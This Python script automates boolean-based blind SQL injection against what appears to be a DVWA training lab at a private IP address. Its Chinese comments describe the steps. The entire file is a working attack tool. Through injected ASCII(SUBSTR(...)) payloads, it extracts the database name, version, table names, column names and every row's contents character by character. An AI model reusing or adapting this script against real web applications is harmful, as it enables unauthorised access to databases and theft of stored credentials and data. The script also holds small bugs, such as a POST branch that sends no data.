from urllib.parse import quote_plus
import requests
import sys

def payloadCode(payload):
    if method == 'get':
        payloadEncode = quote_plus(payload, 'utf-8')
        r = requests.get(url.format(payloadEncode), cookies=cookie)
        return r.status_code
    elif method == 'post':
        data = {injPoint:payload}.update(otherData)
        r = requests.post(url, data)
        return r.status_code
    else:
        print('传参方法错误')
        sys.exit()

def getDatabase():
    # 获取数据库名长度
    for dbNameLen in range(20):
        payload = "1' and LENGTH(database())={0} #".format(dbNameLen) 
        if payloadCode(payload) == 200:
            break
    #print('数据库名长度为：', dbNameLen)

    # 获取数据库名
    dbName = ''
    for i in range(1, dbNameLen+1):
        for charCode in range(33,127):
            payload = "1' and ASCII(SUBSTR(database(),{0},1))={1} #".format(i, charCode) 
            # 比print()逐行输出更酷炫的输出效果
            sys.stdout.write('\r数据库：{0}'.format(dbName+chr(charCode)))
            sys.stdout.flush()
            if payloadCode(payload) == 200:
                dbName += chr(charCode)
                break
    print()
    return dbName

def getVerion():
    # 获取版本长度
    for verNameLen in range(50):
        payload = "1' and LENGTH(version())={0} #".format(verNameLen) 
        if payloadCode(payload) == 200:
            break

    # 获取版本名
    verName = ''
    for i in range(1, verNameLen+1):
        for charCode in range(33,127):
            payload = "1' and ASCII(SUBSTR(version(),{0},1))={1} #".format(i, charCode) 
            sys.stdout.write('\r版本：{0}'.format(verName+chr(charCode)))
            sys.stdout.flush()
            if payloadCode(payload) == 200:
                verName += chr(charCode)
                break
    print()

def getTable(dbName):
    # 获取表数量
    for tableNum in range(10):
        payload = "1' and (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{0}')={1} #".format(dbName, tableNum)
        if payloadCode(payload) == 200:
            break
    # print('表数量为：', tableNum)
    # 表数量为： 2

    # 获取表名长度
    tableNameLen = []
    for j in range(0, tableNum):
        for singleTableNameLen in range(20):
            payload =  "1' and LENGTH((SELECT table_name FROM information_schema.tables where table_schema='{0}' LIMIT {1},1))={2} #".format(dbName, j, singleTableNameLen)
            if payloadCode(payload) == 200:
                tableNameLen.append(singleTableNameLen)
                break
    # print('表名长度为：', tableNameLen)

    # 获取表名
    tableName = []
    for tab in range(tableNum): # 第k张表
        tableName.append('')
        for cha in range(1, tableNameLen[tab]+1): # 表名第l个字母
            for charCode in range(33,127): # 遍历字母集合
                payload = "1' and ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema='{0}' LIMIT {1},1),{2},1))={3} #".format(dbName, tab, cha, charCode) 
                if payloadCode(payload) == 200:
                    tableName[tab] += chr(charCode)
                    sys.stdout.write('\r表：{0}'.format(tableName))
                    sys.stdout.flush()
                    break
    print()
    return tableNum, tableName

def getColumn(tableNum, tableName):
    # 获取列数
    colNums = []
    for tab in range(tableNum):
        for colNum in range(20):
            payload = "1' and (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{0}')={1} #".format(tableName[tab], colNum)
            if payloadCode(payload) == 200:
                colNums.append(colNum)
                break
    # print('列数量为：', colNums)            
    # 列数量为： [3, 8]
            
    # 获取列名长度
    colNameLen = [[] for _ in range(tableNum)]
    for tab in range(tableNum):
        for col in range(0, colNums[tab]): # 遍历列
            for singleColNameLen in range(20): 
                payload =  "1' and LENGTH((SELECT column_name FROM information_schema.columns where table_name='{0}' LIMIT {1},1))={2} #".format(tableName[tab], col, singleColNameLen)
                if payloadCode(payload) == 200:
                    colNameLen[tab].append(singleColNameLen)
                    break
    # print('列名长度为：', colNameLen)
                
    # 获取列名
    colName = [["" for _ in sublist] for sublist in colNameLen]
    for tab in range(tableNum): # 第tabNo张表
        for col in range(len(colNameLen[tab])): # 第col列
            for cha in range(1, colNameLen[tab][col]+1): # 列名第cha个字母
                for charCode in range(33,127): # 遍历字母集合
                    payload = "1' and ASCII(SUBSTR((SELECT column_name FROM information_schema.columns where table_name='{0}' LIMIT {1},1),{2},1))={3} #".format(tableName[tab], col, cha, charCode) 
                    if payloadCode(payload) == 200:
                        colName[tab][col] += chr(charCode)
                        sys.stdout.write('\r列：{0}'.format(colName))
                        sys.stdout.flush()
                        break
    print()
    return colNums, colName

def getKey(tableNum, tableName, colNums, colName):
    # 获取字段数
    keyNums = []
    for tab in range(tableNum):
        for keyNum in range(20):
            payload = "1' and (SELECT COUNT(user) FROM {0})={1} #".format(tableName[tab], keyNum)
            if payloadCode(payload) == 200:
                keyNums.append(keyNum)
                break
    # print('字段数量为：', keyNums) 
    # 字段数量为： [1, 5]

    # 获取字段长度
    keyLens = [[[0 for _ in range(colNums[i])] for _ in range(keyNums[i])] for i in range(tableNum)]
    for tab in range(tableNum): # 遍历表
        for key in range(keyNums[tab]): # 遍历字段
            for col in range(colNums[tab]): # 遍历列
                for keyLen in range(100):
                    # 非盲注查看users表avatar列的第0个字段：-1' UNION SELECT 1,SUBSTR((SELECT avatar FROM users LIMIT 0,1),1) #
                    payload =  "1' and LENGTH((SELECT {0} FROM {1} LIMIT {2},1))={3} #".format(colName[tab][col], tableName[tab], key, keyLen)
                    if payloadCode(payload) == 200:
                        keyLens[tab][key][col] = keyLen
                        break

    # 字段具体内容
    keys = [[['' for _ in range(colNums[i])] for _ in range(keyNums[i])] for i in range(tableNum)]
    for tab in range(tableNum): # 遍历表
        for key in range(keyNums[tab]): # 遍历字段
            for col in range(colNums[tab]): # 遍历列
                for cha in range(1, keyLens[tab][key][col]+1): # 遍历字母
                    for charCode in range(32,127):
                        payload = "1' and ASCII(SUBSTR((SELECT {0} FROM {1} LIMIT {2},1), {3}, 1))={4} #".format(colName[tab][col], tableName[tab], key, cha, charCode)
                        if payloadCode(payload) == 200:
                            keys[tab][key][col] += chr(charCode)
                            #sys.stdout.write('\r字段：{0}'.format(keys))
                            #sys.stdout.flush()
                            break
    #print()
    return keys

def sqli():
    dbName = getDatabase()
    getVerion()
    tableNum, tableName = getTable(dbName)
    colNums, colName = getColumn(tableNum, tableName)
    keys = getKey(tableNum, tableName, colNums, colName)
    for tab in range(tableNum):
        print('[+] 表', tab+1, ':', tableName[tab])
        for i in colName[tab]:
            if colName[tab].index(i) + 1 == len(colName[tab]):
                print(i)
            else:
                print(i, end=' | ')
        for i in keys[tab]:
            for j in i:
                if i.index(j) + 1 == len(i):
                    print(j)
                else:
                    print(j, end=' | ')

if __name__ == '__main__':
    method = 'get'
    #injPoint = 'id'
    #otherData = {'Submit':'Submit'}
    url = 'http://192.168.179.131:81/vulnerabilities/sqli_blind/?id={0}&Submit=Submit#' # 注入点需要换成占位符{}
    #url = 'http://192.168.179.131:81/vulnerabilities/sqli_blind/#'
    cookie = {'PHPSESSID':'8iagmjrr49n5igjqvpl50og9e3','security':'low'}
    sqli()
    